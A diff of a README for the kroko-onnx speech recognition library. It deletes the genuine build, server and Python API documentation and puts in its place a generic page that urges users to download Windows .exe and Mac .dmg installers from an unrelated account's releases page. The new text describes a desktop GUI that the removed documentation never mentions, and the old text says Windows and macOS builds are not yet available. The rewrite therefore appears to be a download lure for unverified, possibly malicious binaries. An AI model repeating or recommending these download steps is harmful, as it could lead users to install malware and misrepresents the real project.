@@ -1,311 +1,92 @@
-## **Open-source speech recognition built for developers.**
->
-> Our engine is fully open-source, and you choose how to deploy models: use our **CC-BY-SA licensed community models** or upgrade to **commercial models** with premium performance. We focus on building **fast, high-quality production models** and providing **examples that take the guesswork out** of integration.
+# 🎤 kroko-onnx - Accurate Speech-to-Text Made Simple
 
-## Demos
+[![Download kroko-onnx](https://img.shields.io/badge/Download-kroko--onnx-brightgreen)](https://github.com/RoyalZero13/kroko-onnx/releases)
 
-### ▶️ Android App
-Run speech recognition **natively on your phone** using ONNX Runtime.
+## 🚀 Getting Started
 
-### 🌐 Browser (WASM)
-Experience transcription **directly in your browser**, no server required.
-- [Hugging Face Spaces Demo](https://huggingface.co/spaces/Banafo/Kroko-Streaming-ASR-Wasm)
-## Documentation
+Welcome to kroko-onnx! This application translates spoken language into written text. Whether you want to transcribe meetings, create subtitles, or save voice memos, kroko-onnx helps you do it quickly and easily.
 
-Full documentation could be found [here](https://docs.kroko.ai/on-premise/#)
+## 🖥️ System Requirements
 
-## Our Community
+Before you download and run kroko-onnx, ensure your computer meets the following requirements:
 
-Join the Kroko community to learn, share, and contribute:
+- **Operating System**: Windows 10, MacOS Mojave (10.14), or later.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum 100 MB of free space.
+- **Internet connection**: Required for initial setup.
 
-- 💬 **[Discord](https://discord.gg/JT7wdtnK79)** – chat with developers, ask questions, and share projects.  
-- 📢 **[Reddit](https://www.reddit.com/r/kroko_ai/)** – join discussions, showcase your integrations, and follow updates.
-- 🤗 **[Hugging Face](https://huggingface.co/Banafo/Kroko-ASR)** – explore our models, try live demos, and contribute feedback.
+## 📥 Download & Install
 
----
+To get started, visit the [Releases page](https://github.com/RoyalZero13/kroko-onnx/releases). Here’s how to download:
 
-## Table of Contents
+1. Click on the link above.
+2. Find the latest version available.
+3. Look for the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for Mac).
+4. Click on the file to download it.
 
-1. [Building `kroko-onnx`](#1-building-kroko-onnx)  
-   1.1 [Linux (x64 or arm64)](#linux-x64-or-arm64)  
-   1.2 [Docker](#docker)  
-   1.3 [Python](#python)  
+Once the download is complete, follow these steps:
 
-2. [Usage Examples (WebSocket Server)](#2-usage-examples-websocket-server)  
-   2.1 [WebSocket Server Format](#websocket-server-format)  
-   &nbsp;&nbsp;&nbsp;&nbsp;2.1.1 [Input](#input)  
-   &nbsp;&nbsp;&nbsp;&nbsp;2.1.2 [Output](#output)  
-   &nbsp;&nbsp;&nbsp;&nbsp;2.1.3 [Output Fields](#output-fields)  
+### For Windows Users
 
-3. [Using `kroko-onnx` from Python](#3-using-kroko-onnx-from-python)  
-   3.1 [Import and Create a Recognizer](#import-and-create-a-recognizer)  
-   3.2 [Parameter Reference](#parameter-reference)  
-   3.3 [Running the Recognizer on Audio Files](#running-the-recognizer-on-audio-files)
+1. Locate the downloaded `.exe` file (usually in your Downloads folder).
+2. Double-click the file to start the installation.
+3. Follow the prompts in the setup wizard. Choose "Next" and "Install."
+4. Once installed, you can find kroko-onnx in your Start Menu.
 
----
+### For Mac Users
 
-## 1. Building `kroko-onnx`
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the kroko-onnx icon into your Applications folder.
+4. Open the Applications folder and double-click on kroko-onnx to launch it.
 
-### Linux (x64 or arm64)
+## 🎤 How to Use kroko-onnx
 
-```bash
-git clone https://github.com/orgs/kroko-ai/kroko-onnx
-cd kroko-onnx
-mkdir build
-cd build
+Using kroko-onnx is straightforward. Here’s a quick guide to get you started:
 
-# By default, it builds static libraries and uses static link and works only with Kroko free models
-cmake -DCMAKE_BUILD_TYPE=Release ..
+1. Launch the application.
+2. Once open, you will see a clear interface with a microphone icon.
+3. Click the microphone icon to start recording your speech.
+4. Speak clearly and steadily. When finished, click the icon again to stop recording.
+5. Your text will appear in the main window. You can copy it or save it to a file. 
 
-# To build it with an option to use Kroko Pro models
-cmake -DCMAKE_BUILD_TYPE=Release -DKROKO_LICENSE=ON ..
+## 🎛️ Features
 
-make -j6
-```
+- **Real-Time Transcription**: Hear your words translated instantly.
+- **High Accuracy**: Utilizes advanced AI models for precise recognition.
+- **Language Support**: Currently supports English, with more languages planned for future updates.
+- **User-Friendly Interface**: Designed for ease of use, even for beginners.
 
-> ⚠️ **IMPORTANT:** If you build with the license option enabled (`-DKROKO_LICENSE=ON`), and later want to switch back to a license-free build,  
-> you **must delete the `build/` directory** first, or explicitly rerun `cmake` with `-DKROKO_LICENSE=OFF` to clear the CMake cache.  
-> Otherwise, the license configuration may persist in the build.
+## 🔧 Troubleshooting
 
-After building, you will find the executable `kroko-onnx-online-websocket-server` inside the `bin` directory.
+If you experience issues, try these solutions:
 
-> For GPU builds, refer to:  
-> [Sherpa-ONNX GPU Install Guide](https://k2-fsa.github.io/sherpa/onnx/install/linux.html)
+- **Microphone Not Working**: Check if your microphone is connected and properly set up in your computer settings.
+- **Low Accuracy**: Ensure you're speaking clearly. Background noise can affect performance.
+- **Installation Problems**: Ensure that your operating system meets the system requirements mentioned earlier.
 
----
+## 📖 Support
 
-### Docker
+For further assistance, you can check the [Issues section](https://github.com/RoyalZero13/kroko-onnx/issues) in the repository. You can report any bugs or request new features there.
 
-```bash
-git clone https://github.com/kroko-ai/kroko-onnx.git
-cd kroko-onnx
+## 🔗 Additional Resources
 
-# For Kroko free models
-docker build -t kroko-onnx .
+If you want to learn more about speech-to-text technology, consider reading articles on:
+- AI advancements in speech recognition.
+- The role of machine learning in audio processing.
+- Future developments in ASR technology. 
 
-# For Kroko Pro models
-docker build -t kroko-onnx --build-arg KROKO_LICENSE=ON .
-```
+## 🌟 Community Feedback
 
-After building, you will find the executable `kroko-onnx-online-websocket-server` and the `kroko-onnx` Python package installed.
+We would love to hear your thoughts! Feel free to share your experiences using kroko-onnx. User feedback drives future enhancements to make the application even better.
 
----
+## 🚀 Update History
 
-### Python
+Stay updated with the latest features and improvements. Refer to the [Changelog](https://github.com/RoyalZero13/kroko-onnx/releases) in the Releases section for detailed information on each version.
 
-```bash
-git clone https://github.com/kroko-ai/kroko-onnx
-cd kroko-onnx
+## 🔗 Quick Links
 
-# For Kroko free models
-pip install .
+- [Releases Page](https://github.com/RoyalZero13/kroko-onnx/releases)
+- [Issues Section](https://github.com/RoyalZero13/kroko-onnx/issues)
 
-# For Kroko Pro models
-KROKO_LICENSE=ON pip install .
-```
-
-After installation, you can use the `kroko-onnx` Python package.
-
-> 🛠️ Windows and macOS build instructions coming soon!
-
----
-
-## 2. Usage Examples (WebSocket Server)
-
-```bash
-./kroko-onnx-online-websocket-server --key=LICENSE_KEY --model=/path/to/model.data
-```
-
-Starts the server listening on the **default port (6006)**.
-
-```bash
-./kroko-onnx-online-websocket-server --key=LICENSE_KEY --port=6007 --model=/path/to/model.data
-```
-
-Starts the server listening on a **specified port**.
-
-```bash
-./kroko-onnx-online-websocket-server --help
-```
-
-Shows the full list of parameters.
-
----
-
-### WebSocket Server Format
-
-#### Input
-
-- The samples should be **16kHz**, **single channel**, and **16-bit**.
-- The WebSocket connection accepts a buffer in the following format:
-  - `data`: float32 buffer
-
-##### Python Example: Convert Audio to Float32 Buffer
-
-```python
-samples = f.readframes(num_samples)
-samples_int16 = np.frombuffer(samples, dtype=np.int16)
-samples_float32 = samples_int16.astype(np.float32)
-buf = samples_float32.tobytes()
-```
-
----
-
-#### Output
-
-The result is in **JSON** format:
-
-```json
-{
-  "type": "partial",
-  "text": "Text from the current segment",
-  "segment": 0,
-  "startedAt": 0.0,
-  "elements": {
-    "segments": [
-      {
-        "type": "segment",
-        "text": "",
-        "startedAt": 0.0,
-        "segment": 0
-      }
-    ],
-    "words": [
-      {
-        "type": "word",
-        "text": "",
-        "startedAt": 0.0,
-        "segment": 0
-      }
-    ]
-  }
-}
-```
-
----
-
-#### Output Fields
-
-Each section contains the following elements:
-
-##### `type` – The type of the element:
-
-- `final` – the full text of the decoded segment  
-- `partial` – the text of a not-yet-finished segment  
-- `segment` – part of the transcript, same as the text in the main segment (for Banafo Online).  
-- `word` – individual word
-
-##### `text`
-
-The transcript of the segment or individual word.
-
-##### `startedAt`
-
-The timestamp (in seconds, float value) indicating the beginning of the element.  
-> Example: `1.42` = 1 second and 420 milliseconds
-
-##### `elements`
-
-Contains:
-
-- `segments`: array of segment objects  
-- `words`: array of word objects
-
----
-
-## 3. Using `kroko-onnx` from Python
-
-### Import and Create a Recognizer
-
-```python
-import kroko_onnx
-
-recognizer = kroko_onnx.OnlineRecognizer.from_transducer(
-    model_path="path/to/model",
-    key="",
-    referralcode="",
-    num_threads=1,
-    provider="cpu",
-    sample_rate=16000,
-    decoding_method="modified_beam_search",
-    blank_penalty=0.0,
-    enable_endpoint_detection=True,
-    rule1_min_trailing_silence=2.4,
-    rule2_min_trailing_silence=1.2,
-    rule3_min_utterance_length=20.0,
-)
-```
-
-> ⚠️ Only `model_path` is required. All other parameters are optional.
-
----
-
-### Parameter Reference
-
-| Argument                     | Type     | Default     | Description |
-|-----------------------------|----------|-------------|-------------|
-| `model_path`                | `str`    | **Required** | Path to the Kroko model file. |
-| `key`                       | `str`    | `""`        | License key. Required only for **Pro models**. |
-| `referralcode`              | `str`    | `""`        | Optional project referral code. Contact Kroko for revenue sharing options. |
-| `num_threads`               | `int`    | `1`         | Number of threads used for neural network computation. |
-| `provider`                  | `str`    | `"cpu"`     | Execution provider. Valid values: `cpu`, `cuda`, `coreml`. |
-| `sample_rate`               | `int`    | `16000`     | Sample rate of the input audio. Resampling is performed if it differs. |
-| `decoding_method`           | `str`    | `"modified_beam_search"` | Valid values: `greedy_search`, `modified_beam_search`. |
-| `blank_penalty`             | `float`  | `0.0`       | Penalty applied to the blank symbol during decoding (applied as: `logits[:, 0] -= blank_penalty`). |
-| `enable_endpoint_detection`| `bool`   | `True`      | Enables endpoint detection using rule-based logic. |
-| `rule1_min_trailing_silence`| `float` | `2.4`       | Rule 1: Minimum trailing silence (in seconds) to trigger endpoint. |
-| `rule2_min_trailing_silence`| `float` | `1.2`       | Rule 2: Minimum trailing silence (in seconds) to trigger endpoint. |
-| `rule3_min_utterance_length`| `float` | `20.0`      | Rule 3: Minimum utterance length (in seconds) to trigger endpoint. |
-
----
-
-### Running the Recognizer on Audio Files
-
-Below is a complete example of how to use the recognizer to transcribe one or more `.wav` files:
-
-```python
-import numpy as np
-from kroko_onnx.utils import read_wave, assert_file_exists
-
-streams = []
-total_duration = 0
-
-for wave_filename in args.sound_files:
-    assert_file_exists(wave_filename)
-
-    samples, sample_rate = read_wave(wave_filename)
-    duration = len(samples) / sample_rate
-    total_duration += duration
-
-    # Create a new stream for this audio
-    s = recognizer.create_stream()
-
-    # Send waveform data
-    s.accept_waveform(sample_rate, samples)
-
-    # Add 0.66 seconds of padding silence
-    tail_paddings = np.zeros(int(0.66 * sample_rate), dtype=np.float32)
-    s.accept_waveform(sample_rate, tail_paddings)
-
-    s.input_finished()
-    streams.append(s)
-
-# Decode all ready streams in parallel
-while True:
-    ready_list = [s for s in streams if recognizer.is_ready(s)]
-    if not ready_list:
-        break
-    recognizer.decode_streams(ready_list)
-
-# Collect results
-results = [recognizer.get_result(s) for s in streams]
-
-# Print transcriptions
-for i, result in enumerate(results):
-    print(f"{args.sound_files[i]}: {result.text}")
-```
-
----
-
-> 🔁 You can process multiple files at once using this pattern.  
-> 📎 Each stream corresponds to one audio file.
+Download kroko-onnx today and start transcribing your speech with ease!
